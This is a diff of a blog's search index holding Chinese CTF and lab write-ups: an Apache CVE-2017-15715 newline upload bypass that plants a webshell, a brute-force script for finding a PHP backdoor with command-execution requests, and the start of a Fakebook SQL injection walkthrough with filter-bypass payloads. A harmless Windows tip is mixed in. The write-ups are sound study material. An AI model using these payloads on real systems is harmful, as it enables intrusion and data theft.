+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
 <span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
-<h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
+<h1 id="问题描述">问题描述</h1>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>Apache</tag>
+        <tag>Windows小知识</tag>
       </tags>
   </entry>
   <entry>
@@ -1176,6 +1142,40 @@
       </tags>
   </entry>
   <entry>
+    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
+    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
+<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
+<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
+<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
+<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
+<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
+<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
+<p>成功获得 webshell。</p>
+<h1 id="总结">总结</h1>
+<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
+<h1 id="资源">资源</h1>
+<ol type="1">
+<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
+<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>安洵杯 2019 easy_web</title>
     <url>/2022/04/01/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -1213,36 +1213,6 @@
         <tag>php伪协议</tag>
         <tag>命令执行</tag>
         <tag>MD5碰撞绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯 2019 高明的黑客</title>
-    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，得到如下信息</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
-<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
-<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
-<h1 id="解题">解题</h1>
-<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
-<p>最终结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
-<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
-<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
-<h1 id="总结">总结</h1>
-<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
@@ -1429,6 +1399,36 @@
       </tags>
   </entry>
   <entry>
+    <title>强网杯 2019 高明的黑客</title>
+    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，得到如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
+<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
+<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
+<h1 id="解题">解题</h1>
+<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
+<p>最终结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
+<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
+<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
+<h1 id="总结">总结</h1>
+<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第2周：Vulnhub cloudantivirus writeup</title>
     <url>/2022/03/29/%E7%AC%AC2%E5%91%A8%EF%BC%9AVulnhub%20cloudantivirus%20writeup/</url>
     <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第2周，该靶机难度简单。</p>
@@ -1548,64 +1548,6 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网鼎杯 2018 Fakebook</title>
-    <url>/2022/03/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%20Fakebook/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，有 <code>login</code> 和 <code>join</code> 两个按钮，先用 admin 弱口令测试了一下，发现登陆失败，就尝试注册一个账号。这里需要注意的是 blog 那一栏应该有特殊的验证，我这里使用 <code>123.blog</code> 成功注册。</p>
-<p>登录成功后发现username可以点击，点击之后 url 出现了一个 no 参数，因此测试一下是否存在 sql 注入。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162039.png" /></p>
-<h1 id="第一次sql注入">第一次sql注入</h1>
-<p>先用如下payload测试，发现注入点的闭合方式为空。接下来就是常规的注入过程。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1=1</span><br><span class="line">?no=1=2</span><br></pre></td></tr></table></figure></p>
-<p>然后 fuzz 以下，发现没有字符被过滤（可能是我的字典太小了）</p>
-<h2 id="获取字段数">获取字段数</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=1 order by 4</span><br></pre></td></tr></table></figure>
-<h2 id="测试显示位">测试显示位</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
-<p>发现这个payload被过滤了。但是空格， 逗号，union，select都没有被过滤。经过多次测试，发现后台应该检测的是<code>union select</code>，那么payload设置为 <code>union/**/select</code> 即可绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?no=-1 union/**/select 1,2,3,4</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321162640.png" /></p>
-<p>上面的信息很丰富：</p>
-<ul>
-<li><strong>Notice</strong>: unserialize(): Error at offset 0 of 1 bytes in <strong>/var/www/html/view.php</strong> on line <strong>31</strong> 存在反序列化</li>
-<li>显示位为 2</li>
-<li>地址为：<strong>/var/www/html/view.php</strong></li>
-</ul>
-<h2 id="常规注入">常规注入</h2>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?no=-1 union/**/select 1,database(),3,4</span><br><span class="line">2. ?no=-1 union/**/select 1,user(),3,4</span><br><span class="line">3. ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">4. ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#x27;users&#x27;</span><br><span class="line">5. ?no=-1 union/**/select 1,no,3,4 from fakebook.users</span><br></pre></td></tr></table></figure>
-<p>获得的结果依次是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fakebook</span><br><span class="line">root@localhost</span><br><span class="line">users</span><br><span class="line">no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">1</span><br><span class="line">hdf</span><br><span class="line">3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;hdf&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>接下来就不知道该如何是好了，如果是单纯的 sql 注入，应该会显示出 flag，这明显是信息收集的还不够。</p>
-<h1 id="信息收集">信息收集</h1>
-<p>想到 <code>robots.txt</code> 看一下 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /user.php.bak</span><br></pre></td></tr></table></figure></p>
-<p>发现存在着备份文件泄露，下载打开得到如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span 